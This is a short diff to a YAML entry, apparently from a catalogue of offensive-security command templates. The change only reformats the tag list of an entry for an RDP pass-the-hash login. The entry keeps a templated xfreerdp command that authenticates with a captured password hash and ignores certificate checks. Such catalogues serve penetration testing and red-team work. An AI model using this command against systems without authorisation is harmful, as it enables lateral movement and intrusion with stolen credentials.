@@ -1,11 +1,6 @@
 name: xfreerdp Pass-the-Hash
 description: RDP connection using pass-the-hash via xfreerdp.
-tags:
-  - windows
-  - rdp
-  - xfreerdp
-  - execution
-  - hash
+tags: [windows, rdp, xfreerdp, execution, hash]
 shell: "xfreerdp /u:{{username}} /d:{{domain}} /pth:{{hash}} /v:{{target}} /cert-ignore"
 inputs:
   - id: target
